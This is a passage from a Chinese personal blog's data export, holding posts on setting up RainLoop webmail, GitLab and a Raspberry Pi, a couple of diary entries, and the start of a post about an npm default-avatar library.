rel=\"noopener\">Safari 3+</a>, <a href=\"http://www.google.com/chrome/\" target=\"_blank\" rel=\"noopener\">Google Chrome</a></p>\n<p><strong>Optional: </strong><a href=\"http://php.net/manual/en/book.pdo.php\" target=\"_blank\" rel=\"noopener\">PDO</a> (<a href=\"http://php.net/manual/en/ref.pdo-mysql.php\" target=\"_blank\" rel=\"noopener\">MySQL</a>/<a href=\"http://php.net/manual/en/ref.pdo-pgsql.php\" target=\"_blank\" rel=\"noopener\">PostgreSQL</a>/<a href=\"http://php.net/manual/en/ref.pdo-sqlite.php\" target=\"_blank\" rel=\"noopener\">SQLite</a>) PHP extension (for contacts)<br>PHP的扩展，除了openssl，curl安装时需要特别指定 <code>--with-openssl`</code>–with-curl` ,其余扩展都是默认安装的．</p>\n</blockquote>\n<p>&nbsp;</p>\n<h2 id=\"搭建\"><a href=\"#搭建\" class=\"headerlink\" title=\"搭建\"></a>搭建</h2><h5 id=\"安装文档\"><a href=\"#安装文档\" class=\"headerlink\" title=\"安装文档\"></a>安装文档</h5><p><a href=\"http://www.rainloop.net/docs/installation/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/docs/installation/</a></p>\n<h5 id=\"特别注意\"><a href=\"#特别注意\" class=\"headerlink\" title=\"特别注意\"></a>特别注意</h5><h6 id=\"创建数据目录\"><a href=\"#创建数据目录\" class=\"headerlink\" title=\"创建数据目录\"></a>创建数据目录</h6><p>需要在安装目录外创建一个data目录，web服务可读写权限．这个目录包含了许多关键信息，需要配置禁止访问<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /data &#123;</span><br><span class=\"line\">  deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"安装后配置\"><a href=\"#安装后配置\" class=\"headerlink\" title=\"安装后配置\"></a>安装后配置</h6><p>首先需要访问 <a href=\"http://mail.example.com/?admin\" target=\"_blank\" rel=\"noopener\">http://mail.example.com/?admin</a> 配置允许的域名</p>\n<p>初始登录 admin 密码 12345 ,登录后先改掉admin密码</p>\n<p>然后进入 domains 页面: /?/admin#/domains  将你的邮箱域名添加到列表里.然后才能用这个邮箱地址登录</p>\n<h6 id=\"更换语言\"><a href=\"#更换语言\" class=\"headerlink\" title=\"更换语言\"></a>更换语言</h6><p>进入general页面: /?/admin#/general 前台界面支持中文,后台界面不支持</p>\n<h6 id=\"登录\"><a href=\"#登录\" class=\"headerlink\" title=\"登录\"></a>登录</h6><p>用完整的邮箱密码登录即可，如果不想每次输入邮箱的域名，可以在后台域名管理设置为其默认域名．点击域名列表里的域名,勾选 Use short login</p>\n<p>这样就可以只输入邮箱@前的用户名</p>\n"},{"title":"搭建gitlab服务","id":"314","date":"2016-06-05T23:24:51.000Z","_content":"\n为了搭建这个折腾了一天\n\n## 有两种安装方式\n\n### YUM包快速安装\n\n官方推荐，但是集成了nginx,redis,pgsql，需要占用300M的空间。\n\n### gitlab源码配置安装\n\n需要自己安装配置redis,pgsql/mysql。这样轻便很多，但是流程非常复杂\n\n* * *\n\n我选择了YUM快速安装的方式，按照[centos7安装文档](https://about.gitlab.com/downloads/#centos7)来的。但是有个别地方出差错，这里整理一下。\n\n## 问题整理\n\n我遇到的大多数问题，都是sock文件的权限不够，比如`redis.sock`需要加上`chmod a+rx`权限才行。\n\n### 访问502错误\n\n这个需要再等一分钟确认，如果还是502，则说明主服务启动出错了，也可能是ruby服务的sock文件权限问题\n\n```\n/var/log/gitlab/nginx/gitlab_error.log\n```\n\n### 访问500错误\n\n可能是`redis`获取`pgsql`启动出错，查看 `production.log` 日志即可\n\n```\n/var/log/gitlab/gitlab-rails/production.log\n```\n\n我遇到的是redis.sock的权限有误\n\n```\nsudo chmod a+rw /var/opt/gitlab/redis/redis.socket\n```\n\n### gitlab访问主机名的配置\n\n编辑 `/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml`的`gitlab.host`项目\n\n记得重启服务，需要等待1分钟：\n\n```\nsudo gitlab-ctl restart\n```\n\n接下来就可以用 http://git.xiaoai.me 访问了。\n\n如果想支持HTTPS，需要改下gitlab-nginx的配置`/var/opt/gitlab/nginx/conf/gitlab-http.conf`。或者给`gitlab-nginx`外层再套一个nginx，也好兼容机器上的其他网站。\n","source":"_posts/e6-90-ad-e5-bb-bagitlab-e6-9c-8d-e5-8a-a1.md","raw":"---\ntitle: 搭建gitlab服务\nid: 314\ncategories:\n  - linux\ndate: 2016-06-06 07:24:51\ntags:\n---\n\n为了搭建这个折腾了一天\n\n## 有两种安装方式\n\n### YUM包快速安装\n\n官方推荐，但是集成了nginx,redis,pgsql，需要占用300M的空间。\n\n### gitlab源码配置安装\n\n需要自己安装配置redis,pgsql/mysql。这样轻便很多，但是流程非常复杂\n\n* * *\n\n我选择了YUM快速安装的方式，按照[centos7安装文档](https://about.gitlab.com/downloads/#centos7)来的。但是有个别地方出差错，这里整理一下。\n\n## 问题整理\n\n我遇到的大多数问题，都是sock文件的权限不够，比如`redis.sock`需要加上`chmod a+rx`权限才行。\n\n### 访问502错误\n\n这个需要再等一分钟确认，如果还是502，则说明主服务启动出错了，也可能是ruby服务的sock文件权限问题\n\n```\n/var/log/gitlab/nginx/gitlab_error.log\n```\n\n### 访问500错误\n\n可能是`redis`获取`pgsql`启动出错，查看 `production.log` 日志即可\n\n```\n/var/log/gitlab/gitlab-rails/production.log\n```\n\n我遇到的是redis.sock的权限有误\n\n```\nsudo chmod a+rw /var/opt/gitlab/redis/redis.socket\n```\n\n### gitlab访问主机名的配置\n\n编辑 `/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml`的`gitlab.host`项目\n\n记得重启服务，需要等待1分钟：\n\n```\nsudo gitlab-ctl restart\n```\n\n接下来就可以用 http://git.xiaoai.me 访问了。\n\n如果想支持HTTPS，需要改下gitlab-nginx的配置`/var/opt/gitlab/nginx/conf/gitlab-http.conf`。或者给`gitlab-nginx`外层再套一个nginx，也好兼容机器上的其他网站。\n","slug":"e6-90-ad-e5-bb-bagitlab-e6-9c-8d-e5-8a-a1","published":1,"updated":"2018-03-05T13:04:43.474Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvf0017lzlmjjtfxud9","content":"<p>为了搭建这个折腾了一天</p>\n<h2 id=\"有两种安装方式\"><a href=\"#有两种安装方式\" class=\"headerlink\" title=\"有两种安装方式\"></a>有两种安装方式</h2><h3 id=\"YUM包快速安装\"><a href=\"#YUM包快速安装\" class=\"headerlink\" title=\"YUM包快速安装\"></a>YUM包快速安装</h3><p>官方推荐，但是集成了nginx,redis,pgsql，需要占用300M的空间。</p>\n<h3 id=\"gitlab源码配置安装\"><a href=\"#gitlab源码配置安装\" class=\"headerlink\" title=\"gitlab源码配置安装\"></a>gitlab源码配置安装</h3><p>需要自己安装配置redis,pgsql/mysql。这样轻便很多，但是流程非常复杂</p>\n<hr>\n<p>我选择了YUM快速安装的方式，按照<a href=\"https://about.gitlab.com/downloads/#centos7\" target=\"_blank\" rel=\"noopener\">centos7安装文档</a>来的。但是有个别地方出差错，这里整理一下。</p>\n<h2 id=\"问题整理\"><a href=\"#问题整理\" class=\"headerlink\" title=\"问题整理\"></a>问题整理</h2><p>我遇到的大多数问题，都是sock文件的权限不够，比如<code>redis.sock</code>需要加上<code>chmod a+rx</code>权限才行。</p>\n<h3 id=\"访问502错误\"><a href=\"#访问502错误\" class=\"headerlink\" title=\"访问502错误\"></a>访问502错误</h3><p>这个需要再等一分钟确认，如果还是502，则说明主服务启动出错了，也可能是ruby服务的sock文件权限问题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/var/log/gitlab/nginx/gitlab_error.log</span><br></pre></td></tr></table></figure>\n<h3 id=\"访问500错误\"><a href=\"#访问500错误\" class=\"headerlink\" title=\"访问500错误\"></a>访问500错误</h3><p>可能是<code>redis</code>获取<code>pgsql</code>启动出错，查看 <code>production.log</code> 日志即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/var/log/gitlab/gitlab-rails/production.log</span><br></pre></td></tr></table></figure>\n<p>我遇到的是redis.sock的权限有误</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chmod a+rw /var/opt/gitlab/redis/redis.socket</span><br></pre></td></tr></table></figure>\n<h3 id=\"gitlab访问主机名的配置\"><a href=\"#gitlab访问主机名的配置\" class=\"headerlink\" title=\"gitlab访问主机名的配置\"></a>gitlab访问主机名的配置</h3><p>编辑 <code>/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml</code>的<code>gitlab.host</code>项目</p>\n<p>记得重启服务，需要等待1分钟：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo gitlab-ctl restart</span><br></pre></td></tr></table></figure>\n<p>接下来就可以用 <a href=\"http://git.xiaoai.me\" target=\"_blank\" rel=\"noopener\">http://git.xiaoai.me</a> 访问了。</p>\n<p>如果想支持HTTPS，需要改下gitlab-nginx的配置<code>/var/opt/gitlab/nginx/conf/gitlab-http.conf</code>。或者给<code>gitlab-nginx</code>外层再套一个nginx，也好兼容机器上的其他网站。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>为了搭建这个折腾了一天</p>\n<h2 id=\"有两种安装方式\"><a href=\"#有两种安装方式\" class=\"headerlink\" title=\"有两种安装方式\"></a>有两种安装方式</h2><h3 id=\"YUM包快速安装\"><a href=\"#YUM包快速安装\" class=\"headerlink\" title=\"YUM包快速安装\"></a>YUM包快速安装</h3><p>官方推荐，但是集成了nginx,redis,pgsql，需要占用300M的空间。</p>\n<h3 id=\"gitlab源码配置安装\"><a href=\"#gitlab源码配置安装\" class=\"headerlink\" title=\"gitlab源码配置安装\"></a>gitlab源码配置安装</h3><p>需要自己安装配置redis,pgsql/mysql。这样轻便很多，但是流程非常复杂</p>\n<hr>\n<p>我选择了YUM快速安装的方式，按照<a href=\"https://about.gitlab.com/downloads/#centos7\" target=\"_blank\" rel=\"noopener\">centos7安装文档</a>来的。但是有个别地方出差错，这里整理一下。</p>\n<h2 id=\"问题整理\"><a href=\"#问题整理\" class=\"headerlink\" title=\"问题整理\"></a>问题整理</h2><p>我遇到的大多数问题，都是sock文件的权限不够，比如<code>redis.sock</code>需要加上<code>chmod a+rx</code>权限才行。</p>\n<h3 id=\"访问502错误\"><a href=\"#访问502错误\" class=\"headerlink\" title=\"访问502错误\"></a>访问502错误</h3><p>这个需要再等一分钟确认，如果还是502，则说明主服务启动出错了，也可能是ruby服务的sock文件权限问题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/var/log/gitlab/nginx/gitlab_error.log</span><br></pre></td></tr></table></figure>\n<h3 id=\"访问500错误\"><a href=\"#访问500错误\" class=\"headerlink\" title=\"访问500错误\"></a>访问500错误</h3><p>可能是<code>redis</code>获取<code>pgsql</code>启动出错，查看 <code>production.log</code> 日志即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/var/log/gitlab/gitlab-rails/production.log</span><br></pre></td></tr></table></figure>\n<p>我遇到的是redis.sock的权限有误</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chmod a+rw /var/opt/gitlab/redis/redis.socket</span><br></pre></td></tr></table></figure>\n<h3 id=\"gitlab访问主机名的配置\"><a href=\"#gitlab访问主机名的配置\" class=\"headerlink\" title=\"gitlab访问主机名的配置\"></a>gitlab访问主机名的配置</h3><p>编辑 <code>/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml</code>的<code>gitlab.host</code>项目</p>\n<p>记得重启服务，需要等待1分钟：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo gitlab-ctl restart</span><br></pre></td></tr></table></figure>\n<p>接下来就可以用 <a href=\"http://git.xiaoai.me\" target=\"_blank\" rel=\"noopener\">http://git.xiaoai.me</a> 访问了。</p>\n<p>如果想支持HTTPS，需要改下gitlab-nginx的配置<code>/var/opt/gitlab/nginx/conf/gitlab-http.conf</code>。或者给<code>gitlab-nginx</code>外层再套一个nginx，也好兼容机器上的其他网站。</p>\n"},{"title":"新工作","id":"188","date":"2015-10-26T16:04:35.000Z","_content":"\n今天正式入职新公司，这是我的第五家公司了。\n\n觉得这家公司远不如上一家的技术氛围好，一整天都没有看见讨论技术方案的，更像是同学会，都在聊自己怎么坐车回家。七八个技术里只有一个做PHP的同事在写代码，其他人一整天都看起来都很闲，七点准时下班走人。\n\n所以一下午都在纠结要不要走人，只干了一天就走似乎说不过去，但是又学不到什么东西，以后找工作真的应该慎重。\n\n不过现在心里也在盘算着，这公司活不多，可以利用业余时间搞些开源项目，然后也攒些钱，明年五六月离职。有这些招牌项目，也许就有机会去美丽说，美团这样的大公司了。也正好利用这段时间，学习下计算机的基础课程，备战明年4月份自考。","source":"_posts/e6-96-b0-e5-b7-a5-e4-bd-9c.md","raw":"---\ntitle: 新工作\nid: 188\ncategories:\n  - 经历\ndate: 2015-10-27 00:04:35\ntags:\n---\n\n今天正式入职新公司，这是我的第五家公司了。\n\n觉得这家公司远不如上一家的技术氛围好，一整天都没有看见讨论技术方案的，更像是同学会，都在聊自己怎么坐车回家。七八个技术里只有一个做PHP的同事在写代码，其他人一整天都看起来都很闲，七点准时下班走人。\n\n所以一下午都在纠结要不要走人，只干了一天就走似乎说不过去，但是又学不到什么东西，以后找工作真的应该慎重。\n\n不过现在心里也在盘算着，这公司活不多，可以利用业余时间搞些开源项目，然后也攒些钱，明年五六月离职。有这些招牌项目，也许就有机会去美丽说，美团这样的大公司了。也正好利用这段时间，学习下计算机的基础课程，备战明年4月份自考。","slug":"e6-96-b0-e5-b7-a5-e4-bd-9c","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvg0019lzlmiq2xz09f","content":"<p>今天正式入职新公司，这是我的第五家公司了。</p>\n<p>觉得这家公司远不如上一家的技术氛围好，一整天都没有看见讨论技术方案的，更像是同学会，都在聊自己怎么坐车回家。七八个技术里只有一个做PHP的同事在写代码，其他人一整天都看起来都很闲，七点准时下班走人。</p>\n<p>所以一下午都在纠结要不要走人，只干了一天就走似乎说不过去，但是又学不到什么东西，以后找工作真的应该慎重。</p>\n<p>不过现在心里也在盘算着，这公司活不多，可以利用业余时间搞些开源项目，然后也攒些钱，明年五六月离职。有这些招牌项目，也许就有机会去美丽说，美团这样的大公司了。也正好利用这段时间，学习下计算机的基础课程，备战明年4月份自考。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天正式入职新公司，这是我的第五家公司了。</p>\n<p>觉得这家公司远不如上一家的技术氛围好，一整天都没有看见讨论技术方案的，更像是同学会，都在聊自己怎么坐车回家。七八个技术里只有一个做PHP的同事在写代码，其他人一整天都看起来都很闲，七点准时下班走人。</p>\n<p>所以一下午都在纠结要不要走人，只干了一天就走似乎说不过去，但是又学不到什么东西，以后找工作真的应该慎重。</p>\n<p>不过现在心里也在盘算着，这公司活不多，可以利用业余时间搞些开源项目，然后也攒些钱，明年五六月离职。有这些招牌项目，也许就有机会去美丽说，美团这样的大公司了。也正好利用这段时间，学习下计算机的基础课程，备战明年4月份自考。</p>\n"},{"title":"朋友圈","id":"285","date":"2016-01-31T15:09:38.000Z","_content":"\n昨天给老板的朋友圈点了个赞，结果老板把我屏蔽了，很失落。\n今天一位女神同事突然开放了我朋友圈，又非常高兴，顺手点了个赞。\n\n--- 流水账日志","source":"_posts/e6-9c-8b-e5-8f-8b-e5-9c-88.md","raw":"---\ntitle: 朋友圈\nid: 285\ncategories:\n  - 经历\ndate: 2016-01-31 23:09:38\ntags:\n---\n\n昨天给老板的朋友圈点了个赞，结果老板把我屏蔽了，很失落。\n今天一位女神同事突然开放了我朋友圈，又非常高兴，顺手点了个赞。\n\n--- 流水账日志","slug":"e6-9c-8b-e5-8f-8b-e5-9c-88","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvh001clzlmftdzlcb1","content":"<p>昨天给老板的朋友圈点了个赞，结果老板把我屏蔽了，很失落。<br>今天一位女神同事突然开放了我朋友圈，又非常高兴，顺手点了个赞。</p>\n<p>— 流水账日志</p>\n","site":{"data":{}},"excerpt":"","more":"<p>昨天给老板的朋友圈点了个赞，结果老板把我屏蔽了，很失落。<br>今天一位女神同事突然开放了我朋友圈，又非常高兴，顺手点了个赞。</p>\n<p>— 流水账日志</p>\n"},{"title":"树莓派入门相关资源","id":"149","date":"2015-07-31T16:39:07.000Z","_content":"\n开始折腾树莓派了，这是我的一些总结：\n\n### 刻录SD镜像\n\n未成功，按照官网的说明来做，但没有启动系统，索性从淘宝上买了一个做好的SD卡。\n\n### SSH连接树莓派\n\n    $ ssh pi@树莓派在局域网的地址\n    password:raspberry\n\n参考自：[http://gaozp.github.io/tec/2015/07/25/raspberry.html](http://gaozp.github.io/tec/2015/07/25/raspberry.html) 。不过这里面的wifi密码设置等我照着做了没连接成功，可能我的方法有问题。\n\n### 远程桌面\n\n我使用RDP连接方法，在树莓派上安装\n```\nsudo apt-get install xrdp\n```\n我的fedora22作为客户端，它自带了远程桌面查看器，用它的RDP协议即可连接，不用设置端口什么的，只需要账户密码，就是上面的 pi raspberry。\n\n### 扩展存储\n\n我的SD有16G，但系统默认只使用4G，参考以下文章的步骤即可使用全部空间\n\n[调整你的sd卡分割区的大小](http://www.rs-online.com/designspark/electronics/knowledge-item/raspberry-pi---%E8%B0%83%E6%95%B4%E4%BD%A0%E7%9A%84sd%E5%8D%A1%E5%88%86%E5%89%B2%E5%8C%BA%E7%9A%84%E5%A4%A7%E5%B0%8F)\n\n唯一有出入的是我的系统没有swap分区，不过照做没问题，以后再加swap\n\n### 静态IP\n\n我在树莓派上没有设置成功，只好在路由器上配置。\n\n&nbsp;\n\n&nbsp;","source":"_posts/e6-a0-91-e8-8e-93-e6-b4-be-e5-85-a5-e9-97-a8-e7-9b-b8-e5-85-b3-e8-b5-84-e6-ba-90.md","raw":"---\ntitle: 树莓派入门相关资源\nid: 149\ncategories:\n  - linux\ndate: 2015-08-01 00:39:07\ntags:\n---\n\n开始折腾树莓派了，这是我的一些总结：\n\n### 刻录SD镜像\n\n未成功，按照官网的说明来做，但没有启动系统，索性从淘宝上买了一个做好的SD卡。\n\n### SSH连接树莓派\n\n    $ ssh pi@树莓派在局域网的地址\n    password:raspberry\n\n参考自：[http://gaozp.github.io/tec/2015/07/25/raspberry.html](http://gaozp.github.io/tec/2015/07/25/raspberry.html) 。不过这里面的wifi密码设置等我照着做了没连接成功，可能我的方法有问题。\n\n### 远程桌面\n\n我使用RDP连接方法，在树莓派上安装\n```\nsudo apt-get install xrdp\n```\n我的fedora22作为客户端，它自带了远程桌面查看器，用它的RDP协议即可连接，不用设置端口什么的，只需要账户密码，就是上面的 pi raspberry。\n\n### 扩展存储\n\n我的SD有16G，但系统默认只使用4G，参考以下文章的步骤即可使用全部空间\n\n[调整你的sd卡分割区的大小](http://www.rs-online.com/designspark/electronics/knowledge-item/raspberry-pi---%E8%B0%83%E6%95%B4%E4%BD%A0%E7%9A%84sd%E5%8D%A1%E5%88%86%E5%89%B2%E5%8C%BA%E7%9A%84%E5%A4%A7%E5%B0%8F)\n\n唯一有出入的是我的系统没有swap分区，不过照做没问题，以后再加swap\n\n### 静态IP\n\n我在树莓派上没有设置成功，只好在路由器上配置。\n\n&nbsp;\n\n&nbsp;","slug":"e6-a0-91-e8-8e-93-e6-b4-be-e5-85-a5-e9-97-a8-e7-9b-b8-e5-85-b3-e8-b5-84-e6-ba-90","published":1,"updated":"2018-03-05T12:55:52.926Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvj001elzlm1q6f0r54","content":"<p>开始折腾树莓派了，这是我的一些总结：</p>\n<h3 id=\"刻录SD镜像\"><a href=\"#刻录SD镜像\" class=\"headerlink\" title=\"刻录SD镜像\"></a>刻录SD镜像</h3><p>未成功，按照官网的说明来做，但没有启动系统，索性从淘宝上买了一个做好的SD卡。</p>\n<h3 id=\"SSH连接树莓派\"><a href=\"#SSH连接树莓派\" class=\"headerlink\" title=\"SSH连接树莓派\"></a>SSH连接树莓派</h3><pre><code>$ ssh pi@树莓派在局域网的地址\npassword:raspberry\n</code></pre><p>参考自：<a href=\"http://gaozp.github.io/tec/2015/07/25/raspberry.html\" target=\"_blank\" rel=\"noopener\">http://gaozp.github.io/tec/2015/07/25/raspberry.html</a> 。不过这里面的wifi密码设置等我照着做了没连接成功，可能我的方法有问题。</p>\n<h3 id=\"远程桌面\"><a href=\"#远程桌面\" class=\"headerlink\" title=\"远程桌面\"></a>远程桌面</h3><p>我使用RDP连接方法，在树莓派上安装<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install xrdp</span><br></pre></td></tr></table></figure></p>\n<p>我的fedora22作为客户端，它自带了远程桌面查看器，用它的RDP协议即可连接，不用设置端口什么的，只需要账户密码，就是上面的 pi raspberry。</p>\n<h3 id=\"扩展存储\"><a href=\"#扩展存储\" class=\"headerlink\" title=\"扩展存储\"></a>扩展存储</h3><p>我的SD有16G，但系统默认只使用4G，参考以下文章的步骤即可使用全部空间</p>\n<p><a href=\"http://www.rs-online.com/designspark/electronics/knowledge-item/raspberry-pi---%E8%B0%83%E6%95%B4%E4%BD%A0%E7%9A%84sd%E5%8D%A1%E5%88%86%E5%89%B2%E5%8C%BA%E7%9A%84%E5%A4%A7%E5%B0%8F\" target=\"_blank\" rel=\"noopener\">调整你的sd卡分割区的大小</a></p>\n<p>唯一有出入的是我的系统没有swap分区，不过照做没问题，以后再加swap</p>\n<h3 id=\"静态IP\"><a href=\"#静态IP\" class=\"headerlink\" title=\"静态IP\"></a>静态IP</h3><p>我在树莓派上没有设置成功，只好在路由器上配置。</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>开始折腾树莓派了，这是我的一些总结：</p>\n<h3 id=\"刻录SD镜像\"><a href=\"#刻录SD镜像\" class=\"headerlink\" title=\"刻录SD镜像\"></a>刻录SD镜像</h3><p>未成功，按照官网的说明来做，但没有启动系统，索性从淘宝上买了一个做好的SD卡。</p>\n<h3 id=\"SSH连接树莓派\"><a href=\"#SSH连接树莓派\" class=\"headerlink\" title=\"SSH连接树莓派\"></a>SSH连接树莓派</h3><pre><code>$ ssh pi@树莓派在局域网的地址\npassword:raspberry\n</code></pre><p>参考自：<a href=\"http://gaozp.github.io/tec/2015/07/25/raspberry.html\" target=\"_blank\" rel=\"noopener\">http://gaozp.github.io/tec/2015/07/25/raspberry.html</a> 。不过这里面的wifi密码设置等我照着做了没连接成功，可能我的方法有问题。</p>\n<h3 id=\"远程桌面\"><a href=\"#远程桌面\" class=\"headerlink\" title=\"远程桌面\"></a>远程桌面</h3><p>我使用RDP连接方法，在树莓派上安装<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install xrdp</span><br></pre></td></tr></table></figure></p>\n<p>我的fedora22作为客户端，它自带了远程桌面查看器，用它的RDP协议即可连接，不用设置端口什么的，只需要账户密码，就是上面的 pi raspberry。</p>\n<h3 id=\"扩展存储\"><a href=\"#扩展存储\" class=\"headerlink\" title=\"扩展存储\"></a>扩展存储</h3><p>我的SD有16G，但系统默认只使用4G，参考以下文章的步骤即可使用全部空间</p>\n<p><a href=\"http://www.rs-online.com/designspark/electronics/knowledge-item/raspberry-pi---%E8%B0%83%E6%95%B4%E4%BD%A0%E7%9A%84sd%E5%8D%A1%E5%88%86%E5%89%B2%E5%8C%BA%E7%9A%84%E5%A4%A7%E5%B0%8F\" target=\"_blank\" rel=\"noopener\">调整你的sd卡分割区的大小</a></p>\n<p>唯一有出入的是我的系统没有swap分区，不过照做没问题，以后再加swap</p>\n<h3 id=\"静态IP\"><a href=\"#静态IP\" class=\"headerlink\" title=\"静态IP\"></a>静态IP</h3><p>我在树莓派上没有设置成功，只好在路由器上配置。</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n"},{"title":"用户名作为缺省的头像","id":"329","date":"2018-02-13T01:54:35.000Z","_content":"\n写了一个填充缺省头像的npm库：[https://github.com/joaner/namedavatar](https://github.com/joaner/namedavatar)\n\n在我的不少项目中，都有缺省头像的问题。为了保持个性和方便辨认，会给没有头像的用户填充带名字的头像。\n\n![](https://xiaoai.me/wp-content/uploads/2018/02/68747470733a2f2f7261772e6769746875622e636f6d2f6a6f616e65722f6e616d65646176617461722f6d61737465722f64656d6f2e706e67-720x107.png)\n\n如果上传头像不存在，直接会在 `<img>` 标签上填充默认头像：\n```\n<img alt=\"李连杰\" width=\"32\">\n<img src=\"./invalid.jpg\" alt=\"Tom Hanks\" width=\"40\">\n\n<script>\nrequirejs('namedavatar', function(namedavatar){\n  namedavatar.config({\n    nameType: 'lastName',\n  })\n  // set multi <img> use data-name attribute for full name\n  namedavatar.setImgs(document.querySelectorAll('img[alt]'), 'alt')\n})\n</script>\n\n```\n相比其它类似项目，首先对中文的支持更好。其次是直接在`<img>`标签上填充data URI，绿色无添加，应用成本更低。而且基于`<svg>`，没有用`<canvas>`渲染，性能也会好一点。\n\n## 还支持Vue.js的 directive 指令方式调用：\n\n```\nimport { directive } from 'namedavatar/vue'\n\n// register as directive\nVue.directive('avatar', directive);\n\n// in vue template\n<template>\n<img v-avatar=\"'Tom Hanks'\" width=\"36\"/>\n</template>\n\n```\n","source":"_posts/e7-94-a8-e6-88-b7-e5-90-8d-e4-bd-9c-e4-b8-ba-e7-bc-ba-e7-9c-81-e7-9a-84-e5-a4-b4-e5-83-8f.md","raw":"---\ntitle: 用户名作为缺省的头像\nid: 329\ncategories:\n  - 前端\ndate: 2018-02-13 09:54:35\ntags:\n---\n\n写了一个填充缺省头像的npm库：[https://github.com/joaner/namedavatar](https://github.com/joaner/namedavatar)\n\n在我的不少项目中，都有缺省头像的问题。为了保持个性和方便辨认，会给没有头像的用户填充带名字的头像。\n\n![](https://xiaoai.me/wp-content/uploads/2018/02/68747470733a2f2f7261772e6769746875622e636f6d2f6a6f616e65722f6e616d65646176617461722f6d61737465722f64656d6f2e706e67-720x107.png)\n\n如果上传头像不存在，直接会在 `<img>` 标签上填充默认头像：\n```\n<img alt=\"李连杰\" width=\"32\">\n<img src=\"./invalid.jpg\" alt=\"Tom Hanks\" width=\"40\">\n\n<script>\nrequirejs('namedavatar', function(namedavatar){\n  namedavatar.config({\n    nameType: 'lastName',\n  })\n  // set multi <img> use data-name attribute for full name\n  namedavatar.setImgs(document.querySelectorAll('img[alt]'), 'alt')\n})\n</script>\n\n```\n相比其它类似项目，首先对中文的支持更好。其次是直接在`<img>`标签上填充data URI，绿色无添加，应用成本更低。而且基于`<svg>`，没有用`<canvas>`渲染，性能也会好一点。\n\n## 还支持Vue.js的 directive 指令方式调用：\n\n```\nimport { directive } from 'namedavatar/vue'\n\n// register as directive\nVue.directive('avatar', directive);\n\n// in vue template\n<template>\n<img v-avatar=\"'Tom Hanks'\" width=\"36\"/>\n</template>\n\n```\n","slug":"e7-94-a8-e6-88-b7-e5-90-8d-e4-bd-9c-e4-b8-ba-e7-bc-ba-e7-9c-81-e7-9a-84-e5-a4-b4-e5-83-8f","published":1,"updated":"2018-03-06T10:35:18.052Z","_id":"cjef4yhvl001hlzlm5fax0dlc","comments":1,"layout":"post","photos":[],"link":"","content":"<p>写了一个填充缺省头像的npm库：<a href=\"https://github.com/joaner/namedavatar\" target=\"_blank\" rel=\"noopener\">https://github.com/joaner/namedavatar</a></p>\n<p>在我的不少项目中，都有缺省头像的问题。为了保持个性和方便辨认，会给没有头像的用户填充带名字的头像。</p>\n<p><img src=\"https://xiaoai.me/wp-content/uploads/2018/02/68747470733a2f2f7261772e6769746875622e636f6d2f6a6f616e65722f6e616d65646176617461722f6d61737465722f64656d6f2e706e67-720x107.png\" alt=\"\"></p>\n<p>如果上传头像不存在，直接会在 <code>&lt;img&gt;</code> 标签上填充默认头像：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img alt=&quot;李连杰&quot; width=&quot;32&quot;&gt;</span><br><span class=\"line\">&lt;img src=&quot;./invalid.jpg&quot; alt=&quot;Tom Hanks&quot; width=&quot;40&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">requirejs(&apos;namedavatar&apos;, function(namedavatar)&#123;</span><br><span class=\"line\">  